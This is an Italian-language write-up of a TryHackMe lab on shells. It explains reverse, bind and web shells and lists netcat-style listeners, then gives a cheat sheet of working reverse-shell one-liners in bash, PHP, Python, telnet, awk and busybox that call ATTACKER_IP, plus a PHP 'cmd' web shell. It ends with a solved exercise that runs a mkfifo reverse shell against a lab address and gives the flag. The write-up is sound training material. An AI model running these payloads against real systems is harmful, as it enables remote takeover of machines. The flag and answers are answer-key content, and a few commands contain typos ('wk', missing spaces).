
#tryhackmelabs #laboratorio #reverseshell #bindshell

https://tryhackme.com/room/shellsoverview

### Introduzione

Le shell nella sicurezza informatica sono ampiamente utilizzate dagli aggressori per controllare i sistemi da remoto, il che le rende una parte importante della catena di attacco. In questa sala, esploreremo le diverse shell utilizzate nella sicurezza offensiva, le differenze tra loro e i loro casi d'uso. Questa conoscenza può contribuire a migliorare le competenze di penetration test ed exploit e anche a capire come rilevare quando una shell remota viene utilizzata da un aggressore all'interno di un'organizzazione.

### Avvertenze

L'uso di Metasploit o di altri framework che generano o interagiscono con le shell è stato volutamente tralasciato in questa stanza. L'obiettivo è quello di concentrarsi sulla comprensione del funzionamento delle shell senza l'uso o l'assistenza di uno strumento per configurarle o generarle. Inoltre, in questa stanza, useremo il sistema operativo Linux per tutti gli esempi.


### Panoramica della Shell

Una shell è un software che consente all'utente di interagire con un sistema operativo . Può essere un'interfaccia grafica, ma di solito è un'interfaccia a riga di comando, e questo dipenderà dal sistema operativo in esecuzione sul sistema di destinazione.  

Nella sicurezza informatica, si riferisce comunemente a una specifica sessione shell che un aggressore utilizza per accedere a un sistema compromesso, consentendogli di eseguire comandi ed eseguire software. Ciò  consente agli aggressori di eseguire diverse attività, alcune delle quali sono descritte di seguito.

- **Controllo remoto del sistema** : consente all'aggressore di eseguire comandi o software in remoto nel sistema di destinazione.
- **Escalation dei privilegi** : se l'accesso iniziale tramite una shell è limitato o ristretto, gli aggressori possono provare a ottenere privilegi più elevati o un accesso amministrativo.
- **Esfiltrazione dei dati** : una volta che gli aggressori riescono ad eseguire comandi tramite una shell ottenuta, possono esplorare il sistema per leggere e copiare dati sensibili da esso.
- **Accesso persistente** e di manutenzione : una volta ottenuto l'accesso alla shell, gli aggressori possono creare l'accesso tramite utenti e credenziali o copiare software backdoor per mantenere l'accesso al sistema di destinazione per un utilizzo successivo.
- **Attività post-sfruttamento** : una volta concesso l'accesso a una shell, gli aggressori possono eseguire un'ampia gamma di attività post-sfruttamento, come la distribuzione di malware, la creazione di account nascosti e l'eliminazione di informazioni.
- **Accesso ad altri sistemi sulla rete** : a seconda delle intenzioni dell'attaccante, la shell ottenuta può essere solo un punto di accesso iniziale. L'obiettivo può essere quello di saltare attraverso la rete verso un target diverso, utilizzando la shell ottenuta come perno per raggiungere diversi punti della rete del sistema compromesso. Questa tecnica è nota anche come pivoting.

Tutte le shell che descriveremo nei prossimi esercizi possono aiutare a raggiungere diverse limitazioni degli attacchi descritti sopra.

Qual è l'interfaccia a riga di comando che consente agli utenti di interagire con un sistema operativo?  

```
shell
```

Quale processo prevede l'utilizzo di un sistema compromesso come trampolino di lancio per attaccare altre macchine nella rete?  

```
pivoting
```

Qual è un'attività comune che gli aggressori eseguono dopo aver ottenuto l'accesso alla shell per aumentare i propri privilegi?

```
Privilege Escalation
```

### Reverse Shell

Una reverse shell, a volte chiamata "connect back shell", è una delle tecniche più diffuse per ottenere l'accesso a un sistema durante gli attacchi informatici. Le connessioni partono dal sistema di destinazione e raggiungono la macchina dell'attaccante, il che può contribuire a eludere il rilevamento da parte di firewall di rete e altri dispositivi di sicurezza.  

#### Come funzionano i Reverse Shell
#### **Imposta un ascoltatore Netcat (nc)**

Ora capiamo come funziona una reverse shell in uno scenario pratico utilizzando lo strumento Netcat. Questa utility supporta diversi sistemi operativi e consente la lettura e la scrittura tramite rete.

Come accennato in precedenza, una reverse shell si connetterà al computer dell'attaccante. Questo computer sarà in attesa di una connessione, quindi usiamo Netcat per ascoltare una connessione usando il seguente comando `nc -lvnp 443`.  

terminale

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

Il comando precedente utilizza l' `-l` opzione per indicare a Netcat di ascoltare o attendere una connessione. L' `-v`opzione abilita la modalità dettagliata. L' `-n`opzione impedisce alle connessioni di utilizzare il DNS per la ricerca, quindi non risolverà alcun nome host, ma utilizzerà un indirizzo IP. Infine, il `-p`flag indica la porta che verrà utilizzata per attendere la connessione, nel caso precedente, la porta **443** .

Per attendere una connessione è possibile utilizzare qualsiasi porta, ma gli aggressori e i pentester tendono a utilizzare porte note, utilizzate da altre applicazioni, come **53** , **80** , **8080** , **443** , **139** o **445.** Questo per mischiare la reverse shell con il traffico legittimo ed evitare il rilevamento da parte degli apparecchi di sicurezza.  

##### **Ottenere l'accesso Reverse Shell**

Una volta impostato il listener, l'attaccante dovrebbe eseguire il cosiddetto payload reverse shell. Questo payload di solito sfrutta la vulnerabilità o l'accesso non autorizzato concesso dall'attaccante ed esegue un comando che espone la shell attraverso la rete. Esistono diversi payload che dipendono dagli strumenti e dal sistema operativo del sistema compromesso. Possiamo esplorarne alcuni [qui](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) .

A titolo di esempio, analizziamo un payload di esempio denominato **pipe reverse shell** , come mostrato di seguito.

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Spiegazione del carico utile**

- `rm -f /tmp/f`- Questo comando rimuove qualsiasi file di pipe denominata esistente situato in `/tmp/f/`. Questo garantisce che lo script possa creare una nuova pipe denominata senza conflitti.
- `mkfifo /tmp/f`- Questo comando crea una pipe denominata, o FIFO (first-in, first-out), in `/tmp/f`. Le pipe denominate consentono la comunicazione bidirezionale tra i processi. In questo contesto, fungono da canale per l'input e l'output.
- `cat /tmp/f`- Questo comando legge i dati dalla pipe denominata. Attende l'input che può essere inviato attraverso la pipe.
- `| bash -i 2>&1`- L'output di  `cat`viene inoltrato a un'istanza di shell ( `bash -i`), che consente all'attaccante di eseguire comandi in modo interattivo. `2>&1`Reindirizza l'errore standard allo standard output, garantendo che i messaggi di errore vengano inviati all'attaccante.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`- Questa parte incanala l'output della shell tramite `nc`(Netcat) all'indirizzo IP dell'attaccante ( `ATTACKER_IP`) sulla porta dell'attaccante ( `ATTACKER_PORT`).
- `>/tmp/f` -Questa parte finale invia l'output dei comandi nel pipe denominato, consentendo la comunicazione bidirezionale.

Il payload sopra può esporre la shell `bash`attraverso la rete all'ascoltatore desiderato.

##### **L'attaccante riceve il proiettile**

Una volta eseguito il payload di cui sopra, l'attaccante riceverà una **shell inversa** , come mostrato di seguito, che gli consentirà di eseguire comandi come se stesse effettuando l'accesso a un normale terminale nel sistema operativo .

**Output del terminale dell'attaccante (shell di ricezione)**

terminale

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

L'output sopra mostra la connessione proveniente dall'IP  `10.10.13.37`, che è l'indirizzo IP del target compromesso.  

Rispondi alle domande seguenti

Quale tipo di shell consente a un aggressore di eseguire comandi da remoto dopo che la vittima si è riconnessa?  

```
Reverse Shell
```

Quale strumento viene comunemente utilizzato per impostare un listener per una reverse shell?

```
Netcat
```

### Bind Shell

Come indica il nome, una shell bind assocerà una porta sul sistema compromesso e ascolterà una connessione; quando questa connessione si verifica, espone la sessione della shell in modo che l'aggressore possa eseguire comandi in remoto.

Questo metodo può essere utilizzato quando la destinazione compromessa non consente connessioni in uscita, ma tende a essere meno diffuso poiché deve rimanere attivo e in ascolto delle connessioni, il che può portare al rilevamento.  

#### Come funzionano le shell di legame

**Impostazione della shell di collegamento sul target**

Creiamo una shell di tipo bind. In questo caso, l'attaccante può utilizzare un comando come quello qui sotto sulla macchina di destinazione.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Spiegazione del carico utile**

- `rm -f /tmp/f`- Questo comando rimuove qualsiasi file di pipe denominata esistente situato in `/tmp/f/`. Questo garantisce che lo script possa creare una nuova pipe denominata senza conflitti.
- `mkfifo /tmp/f`- Questo comando crea una pipe denominata, o FIFO, in `/tmp/f`. Le pipe denominate consentono la comunicazione bidirezionale tra i processi. In questo contesto, fungono da canale per l'input e l'output.
- `cat /tmp/f`- Questo comando legge i dati dalla pipe denominata. Attende l'input che può essere inviato attraverso la pipe.
- `| bash -i 2>&1`- L'output di  `cat`viene inoltrato a un'istanza di shell ( `bash -i`), che consente all'attaccante di eseguire comandi in modo interattivo. `2>&1`Reindirizza l'errore standard allo standard output, garantendo che i messaggi di errore vengano restituiti all'attaccante.
- **`| nc -l 0.0.0.0 8080`**- Avvia Netcat in modalità di ascolto ( `-l`) su tutte le interfacce ( `0.0.0.0`) e su tutte le porte `8080`. La shell sarà esposta all'attaccante una volta che si connetterà a questa porta.
- `>/tmp/f` Questa parte finale invia l'output dei comandi nel pipe denominato, consentendo la comunicazione bidirezionale.

Il comando precedente ascolterà le connessioni in ingresso ed esporrà una shell bash. È importante notare che le porte inferiori a 1024 richiederanno l'esecuzione di Netcat con privilegi elevati. In questo caso, l'utilizzo della porta 8080 eviterà questo problema.

**Terminale sulla macchina di destinazione (configurazione della shell Bind)**



```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Una volta eseguito il comando, questo attenderà una connessione in arrivo, come mostrato sopra.

**L'attaccante si connette alla Bind Shell**

Ora che la macchina di destinazione è in attesa di connessioni in arrivo, possiamo utilizzare nuovamente Netcat con il seguente comando per connetterci.

`nc -nv TARGET_IP 8080`

**Spiegazione del comando**

- `nc`- Questo richiama Netcat, che stabilisce la connessione con la destinazione.
- `-n`- Disabilita la risoluzione DNS , consentendo a Netcat di funzionare più velocemente ed evitare ricerche non necessarie.
- `-v`- La modalità dettagliata fornisce un output dettagliato del processo di connessione, ad esempio quando la connessione viene stabilita.
- `TARGET_IP`- L'indirizzo IP della macchina di destinazione su cui è in esecuzione la shell bind.
- `8080`- Il numero di porta su cui è in ascolto la shell bind.

**Terminale dell'attaccante (dopo la connessione)**

terminale

```shell-session
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

Dopo la connessione, possiamo ottenere una shell, come mostrato sopra, ed eseguire i comandi.

Quale tipo di shell apre una porta specifica sul bersaglio per le connessioni in arrivo dall'attaccante?  

```
Bind shell
```

Per l'ascolto sotto quale numero di porta è necessario l'accesso root o autorizzazioni privilegiate?

```
1024
```

### Shell Listeners

Come abbiamo appreso nelle attività precedenti, una reverse shell si connetterà dal bersaglio compromesso alla macchina dell'attaccante. Un'utilità come Netcat gestirà la connessione e consentirà all'attaccante di interagire con la shell esposta, ma Netcat non è l'unica che ci permetterà di farlo.

Esploriamo alcuni strumenti che possono essere utilizzati come listener per interagire con una shell in arrivo.  

**Rlwrap**
Si tratta di una piccola utility che utilizza la libreria GNU readline per fornire una tastiera di modifica e una cronologia.  
 

**Esempio di utilizzo (miglioramento di una shell Netcat con Rlwrap)**  


```shell-session
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Questo si conclude `nc`con `rlwrap`, consentendo l'uso di funzioni come i tasti freccia e la cronologia per una migliore interazione.

  

**Ncat**

Ncat è una versione migliorata di Netcat distribuita dal progetto NMAP . Offre funzionalità aggiuntive, come la crittografia (SSL).

**Esempio di utilizzo (ascolto di shell inverse)**

```shell-session
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

  
**Esempio di utilizzo (ascolto di shell inverse con SSL)**


```shell-session
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

L' `--ssl`opzione abilita la crittografia SSL per l'ascoltatore.

**Socat**

Si tratta di un'utilità che consente di creare una connessione socket tra due origini dati, in questo caso due host diversi.

**Esempio di utilizzo predefinito (ascolto di Reverse Shell):**

```shell-session
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

Il comando precedente utilizzava l' `-d`opzione per abilitare l'output dettagliato; riutilizzandola ( `-d -d`) si aumenterà la verbosità dei comandi. L' `TCP-LISTEN:443`opzione crea un listener TCP sulla porta `443`, stabilendo un socket server per le connessioni in ingresso. Infine, l'opzione STDOUT indirizza tutti i dati in ingresso al terminale.  

Rispondi alle domande seguenti

Quale strumento di rete flessibile consente di creare una connessione socket tra due origini dati?  

```
socat
```

Quale utilità da riga di comando fornisce funzionalità di modifica e cronologia dei comandi in stile readline per i programmi che ne sono privi, migliorando l'interazione con un listener della shell?  

```
Rlwrap
```

Qual è la versione migliorata di Netcat distribuita con il progetto Nmap che offre funzionalità aggiuntive come il supporto SSL per l'ascolto di shell crittografate?

```
ncat
```

### Shell Payloads

Un payload della shell può essere un comando o uno script che espone la shell a una connessione in arrivo nel caso di una shell di tipo bind o a una connessione di tipo send nel caso di una shell di tipo reverse.

Esploriamo alcuni di questi payload che possono essere utilizzati nel sistema operativo Linux per esporre la shell tramite la più diffusa **reverse shell** .  

#### Bash

**Bash Reverse Shell normale**


```shell-session
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

Questa shell inversa  avvia una shell bash interattiva che reindirizza input e output tramite una connessione TCP all'IP dell'attaccante ( **ATTACKER_IP** ) sulla porta `443`. L' `>&`operatore combina sia l'output standard che lo standard error.

  

**Bash legge la riga**  **inversa della shell**


```shell-session
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

Questa reverse shell  crea un nuovo descrittore di file ( `5` in questo caso) e si connette a un socket TCP . Leggerà ed eseguirà i comandi dal socket, inviando l'output attraverso lo stesso socket.

  

**Bash con descrittore di file 196**  **Reverse Shell**


```shell-session
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

Questa reverse shell  utilizza un descrittore di file ( `196` in questo caso) per stabilire una connessione TCP . Permette alla shell di leggere i comandi dalla rete e di inviare l'output attraverso la stessa connessione.

  

**Bash con descrittore di file 5**  **Reverse Shell**


```shell-session
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Simile al primo esempio, questo comando apre una shell ( `bash -i`), ma utilizza un descrittore di file `5`per l'input e l'output, abilitando una sessione interattiva sulla connessione TCP .

#### PHP

**Shell inversa PHP utilizzando la funzione exec**


```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

Questa shell inversa  crea una connessione socket all'IP dell'attaccante sulla porta `443`e utilizza la  `exec` funzione per eseguire una shell, reindirizzando l'input e l'output standard.

  

**Shell inversa PHP utilizzando la funzione shell_exec**


```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Simile al comando precedente, ma utilizza la  `shell_exec` funzione.

  

**PHP Reverse Shell utilizzando la funzione di sistema**


```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```

Questa shell inversa  utilizza la  `system` funzione, che esegue il comando e invia il risultato al browser.

  

**PHP Reverse Shell utilizzando la funzione passthru**


```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

La `passthru`funzione esegue un comando e invia un output grezzo al browser. Questo è utile quando si lavora con dati binari.

  

**Shell inversa PHP utilizzando la funzione popen**


```shell-session
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

Questa shell inversa  serve `popen`ad aprire un puntatore a un file di processo, consentendo l'esecuzione della shell.

### Python

Si prega di notare che i seguenti frammenti di codice richiedono l'utilizzo `python -c`per essere eseguiti, indicato dal segnaposto PY-C  

**Python Reverse Shell mediante l'esportazione di variabili ambientali**


```shell-session
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

Questa shell inversa  imposta l'host remoto e la porta come variabili di ambiente, crea una connessione socket e duplica il descrittore del file socket per l'input/output standard.

**Python Reverse Shell utilizzando il modulo subprocess**


```shell-session
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```

Questa shell inversa utilizza il `subprocess`modulo per generare una shell e impostare un ambiente simile al comando Python Reverse Shell tramite l'esportazione delle variabili d'ambiente.  

**Shell inversa Python corta**


```shell-session
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Questa shell inversa crea un socket ( `s`), si connette all'attaccante e reindirizza input, output ed errore standard al socket utilizzando  `os.dup2()`.

Altri  

**Telnet**


```shell-session
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```

Questa shell inversa crea una pipe denominata utilizzando `mkfifo`e si connette all'attaccante tramite Telnet su IP `ATTACKER_IP` e porta `443`. 

**AWK**


```shell-session
wk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Questa reverse shell utilizza le funzionalità TCP integrate di AWK per connettersi a `ATTACKER_IP:443`. Legge i comandi dell'attaccante e li esegue. Quindi invia i risultati tramite la stessa connessione TCP .

**BusyBox**


```shell-session
busybox nc ATTACKER_IP 443 -e sh
```

Questa reverse shell di BusyBox usa Netcat( `nc`) per connettersi all'attaccante in  `ATTACKER_IP:443`. Una volta connesso, esegue `/bin/sh`, esponendo la riga di comando all'attaccante.  

Rispondi alle domande seguenti

Quale modulo Python è comunemente utilizzato per gestire i comandi shell e stabilire connessioni shell inverse nelle valutazioni della sicurezza?  

```
subprocess
```

Quale metodo di payload della shell in un linguaggio di scripting comune utilizza le  funzioni `exec`,  `shell_exec`,  `system`,  `passthru`, e  `popen` per eseguire comandi in remoto tramite una connessione TCP?  

```
php
```

Quale linguaggio di scripting può utilizzare una reverse shell esportando variabili di ambiente e creando una connessione socket?

```
Python
```

### Web Shell

Una web shell è uno script scritto in un linguaggio supportato da un server web compromesso che esegue comandi tramite il server web stesso. Una web shell è solitamente un file contenente il codice che esegue i comandi e gestisce i file. Può essere nascosta all'interno di un'applicazione o di un servizio web compromesso, rendendola difficile da rilevare e molto diffusa tra gli aggressori.

Le web shell possono essere scritte in diversi linguaggi supportati dai server web, come PHP , ASP, JSP e persino semplici script CGI. 

### Esempio di PHP Web Shell


Diamo un'occhiata a un esempio di web shell PHP per capire come funziona questo processo:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

 La shell di cui sopra può essere salvata in un file con estensione PHP , come , e quindi caricata sul server web dall'aggressore sfruttando vulnerabilità come [Unrestricted File Upload](https://tryhackme.com/r/room/uploadvulns) ,  [File Inclusion](https://tryhackme.com/r/room/fileinc) ,  [Command Injection](https://tryhackme.com/r/room/oscommandinjection) ,  tra le altre, oppure ottenendo un accesso non autorizzato allo stesso.  `shell.php` [](https://tryhackme.com/r/room/uploadvulns)[](https://tryhackme.com/r/room/fileinc)[](https://tryhackme.com/r/room/oscommandinjection)

Una volta distribuita la web shell sul server, è possibile accedervi tramite l'URL in cui è ospitata, in questo esempio  http://victim.com/uploads/shell.php . Come osservato dal codice in [manca contesto]`shell.php` , dobbiamo fornire un metodo GET e il valore della variabile [manca contesto] `cmd`, che dovrebbe contenere il comando che l'attaccante desidera eseguire. Ad esempio, se vogliamo eseguire il comando  **whoami,**  la richiesta all'URL dovrebbe essere:

 `http://victim.com/uploads/shell.php ?cmd = whoami`

 Quanto sopra eseguirà il comando **whoami** e visualizzerà il risultato nel browser web.

### Web Shell esistenti disponibili online

La potenza dei linguaggi supportati dai server web può dare vita a web shell con numerose funzionalità, evitando al contempo il rilevamento. Esploriamo alcune delle web shell più diffuse disponibili online. 

- [p0wny-shell - Una web shell](https://github.com/flozz/p0wny-shell) PHP minimalista composta da un singolo file che consente l'esecuzione di comandi remoti.
- [b374k shell : una web shell](https://github.com/b374k/b374k) PHP più ricca di funzionalità, con gestione dei file ed esecuzione di comandi, tra le altre funzionalità.  
- [c99 shell - Una web shell](https://www.r57shell.net/single.php?id=13) PHP nota e robusta con funzionalità estese.  

Puoi trovare altre web shell su : [https://www.r57shell.net/index.php .](https://www.r57shell.net/index.php)

Rispondi alle domande seguenti

Quale tipo di vulnerabilità consente agli aggressori di caricare uno script dannoso non limitando i tipi di file?  

```
Unrestricted File Upload
```

Cos'è uno script dannoso caricato su un'applicazione web vulnerabile per ottenere un accesso non autorizzato?

```
Web Shell
```

### Practical Task

Ora che abbiamo imparato a conoscere i diversi tipi di reverse shell, mettiamo alla prova le nostre conoscenze con un esercizio pratico e otteniamo il flag nel formato THM {} dal server web vulnerabile. Cliccate sul  `Start Machine` pulsante per avviare la sfida. Dopodiché, sarà accessibile ai seguenti URL:

- MACHINE_IP:8080 ospita la landing page
- MACHINE_IP:8081 ospita l'applicazione web vulnerabile all'iniezione di comandi.
- MACHINE_IP:8082 ospita l'applicazione web che è vulnerabile al caricamento di file senza restrizioni.

Puoi accedere a quanto sopra utilizzando `AttackBox`, che verrà visualizzato su uno schermo diviso, oppure puoi utilizzare il tuo accesso tramite VPN .

**Nota:** attendere 2 minuti affinché la macchina virtuale si avvii completamente.

Rispondi alle domande seguenti

Utilizzando una shell reverse o bind, sfrutta la vulnerabilità di iniezione di comandi per ottenere una shell.  Qual è il contenuto del flag salvato nella directory /?  

pc attaccante
```
nc -lvnp 1234
```
vittima
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.248.84 1234 >/tmp/f
```

```
ls -al /
```

```
ls -al /
total 88
drwxr-xr-x   1 root root 4096 Oct 18  2024 .
drwxr-xr-x   1 root root 4096 Oct 18  2024 ..
-rwxr-xr-x   1 root root    0 Oct 18  2024 .dockerenv
drwxr-xr-x   1 root root 4096 Oct 18  2024 bin
drwxr-xr-x   2 root root 4096 Sep  3  2022 boot
drwxr-xr-x   5 root root  340 Jun 26 12:18 dev
drwxr-xr-x   1 root root 4096 Oct 18  2024 etc
-rw-r--r--   1 root root   46 Oct 18  2024 flag.txt
drwxr-xr-x   2 root root 4096 Sep  3  2022 home
drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
drwxr-xr-x   2 root root 4096 Nov 14  2022 lib64
drwxr-xr-x   2 root root 4096 Nov 14  2022 media
drwxr-xr-x   2 root root 4096 Nov 14  2022 mnt
drwxr-xr-x   2 root root 4096 Nov 14  2022 opt
dr-xr-xr-x 283 root root    0 Jun 26 12:18 proc
drwx------   1 root root 4096 Nov 15  2022 root
drwxr-xr-x   1 root root 4096 Nov 15  2022 run
drwxr-xr-x   1 root root 4096 Nov 15  2022 sbin
drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
dr-xr-xr-x  13 root root    0 Jun 26 12:18 sys
drwxrwxrwt   1 root root 4096 Jun 26 12:22 tmp
drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
drwxr-xr-x   1 root root 4096 Nov 15  2022 var

```

```
cat /flag.txt
```

```
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
```
Utilizzando una web shell, sfrutta la vulnerabilità del caricamento di file senza restrizioni e ottieni una shell. Qual è il contenuto del flag salvato nella directory /?

```
nano webshell.php
```
```
<?php  
echo "<pre>";  
echo "Flag content:\n";  
echo file_get_contents('/flag.txt');  
echo "</pre>";  
?>
```
caricare il file in
```
http://10.10.246.152:8082/
```

```
http://10.10.246.152:8082/uploads/webshell.php
```

```
Flag content:
THM{xxxxxxxxxxxxxxxxxx}
```

